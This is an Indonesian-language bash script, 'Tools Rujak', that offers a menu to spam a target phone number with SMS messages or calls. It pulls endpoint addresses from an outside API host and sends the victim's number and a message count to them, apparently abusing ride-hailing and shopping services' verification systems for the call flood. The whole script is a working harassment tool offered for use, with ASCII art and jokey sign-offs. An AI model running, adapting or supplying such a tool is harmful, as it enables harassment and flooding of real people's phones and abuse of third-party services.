#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////                                                                       ////
#////               000000000    000           000  000000                  ////
#////               00      00   00 00       00 00  00     00               ////
#////               00      00   00  00     00  00  00     00               ////
#////               000000000    00   00   00   00  00     00               ////
#////               00      00   00    00 00    00  00     00               ////
#////               00       00  00     000     00  000000                  ////
#////                                                                       ////
#////                                                                       ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#PERHATIAN : KEHEBATAN HANYA UNTUK DILATIH DAN DILESTARIKAN
#GUNAKAN SECUKUPNYA BIAR KAYA OBAT :V
troll(){
    clear
    sleep 0.03
    echo "           / \ "
    sleep 0.03
    echo "         /  ^   \ "
    sleep 0.03
    echo "         |  Y   | "
    sleep 0.03
    echo "         |  O   | "
    sleep 0.03
    echo "         |  U   | "
    sleep 0.03
    echo "         |  T   | "
    sleep 0.03
    echo "         |  U   | "
    sleep 0.03
    echo "         |  B   | "
    sleep 0.03
    echo "         |  E   | "
    sleep 0.03
    echo "         |      | "
    sleep 0.03
    echo "         |  R   |\ "
    sleep 0.03
    echo "         |  M   |  \ "
    sleep 0.03
    echo "         |  D   |    \ "
    sleep 0.03
    echo "         |      |      \ "
    sleep 0.03 
    echo "         |  M   |        \ "
    sleep 0.03
    echo "         |  R   |          \ "
    sleep 0.03
    echo "         |  R   |            \ "
    sleep 0.03
    echo "         |      |              \ "
    sleep 0.03
    echo "         |      |                \ "
    sleep 0.03
    echo "         |      |                  \ "
    sleep 0.03
    echo "         |      |                   | "
    sleep 0.03
    echo "        ''''''''''                  | "
    sleep 0.03
     echo "        ' ' ' ' ___________________| "
    sleep 0.03
    echo " ============================="
    sleep 2
    echo " ==      Tools Rujak        =="
    sleep 0.7
    echo " ============================="
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
get_call=$(curl -s http://zlucifer.com/api/hackbae.php?request=call)
mulai (){
    echo "Gunakan Tools Rujak Lagi?"
    echo "y/n?"
    echo
    read lagi
    if [ $lagi = "y" ]; then
            spam
    else
            echo "Terimakasih sudah menggunakan Tools Rujak"
    fi
}
#spam
spam(){
    clear
    troll
    echo
    echo "[1] Spam SMS"
    echo "[2] Spam Telp"
    echo "[3] Close Tools Rujak"
    echo
    echo "1/2/3?"
    read pilih
    if [ $pilih = "1" ]; then
            echo "Tools Spam SMS"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 0812345678
            read target # masukin no telp
            echo
            echo "Berapa sms yang mau dikirim?"
            read paket
            echo
            echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                    load
                    clear
                    echo Melakukan spam SMS ke nomor $target
                    echo
                    echo "Jangan close aplikasi sebelum spam selesai"
                    echo "========================================"
                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
                    echo " Gunakan tools dengan bijak"
                    echo
                    echo " Love Sayang :V "
                    echo " -jackekids"
                    echo "======================================="
            else
                    echo "Kesalahan"
            fi
        mulai
    elif [ $pilih = "2" ]; then
            echo "Tools Spam Call"
            #function spam
            echo
            echo "Silahkan masukan nomor telp target"
            echo contoh 0812345678
            read target # masukin no telp
            echo
            echo "Gunakan API Grab/Toped?"
            echo "[1] GRAB"
            echo "[2] TOPED"
            echo "1/2?"
            read api
            if [ $api = "1" ]; then
                  api_spam="grab"
            else
                  api_spam="toped"
            fi
            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
            echo y/n?
            read confirm
            echo
            if [ $confirm = "y" ]; then
                  load
                  clear
                  echo Melakukan spam call ke nomor $target
                  echo
                  echo "Jangan close aplikasi sebelum spam selesai"
                  echo "========================================"
                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
                  echo -e $cek_target
                  echo " Gunakan tools dengan bijak"
                  echo
                  echo " Love u always "
                  echo " Jackekids~"
                  echo "========================================"
            else
                  echo Kesalahan, silahkan coba lagi
            fi
        mulai
    elif [ $pilih = "3" ]; then
        echo "Terimakasih sudah menggunakan Tools Rujak"
        close
    else
        clear
        echo "Kesalahan"
        mulai
    fi
}
close(){
    exit
}
clear
echo "Loading.."
load
clear
troll
echo Selamat datang, Silahkan isi nickname kalian. #tulisan keluar
read nick #membaca yang ditulis
clear
troll
echo Selamat datang $nick ":)"
echo
echo "Mulai Tools Rujak?"
echo "y/n?"
read mulai
if [ $mulai = "y" ]; then
      spam
else
      close
fi
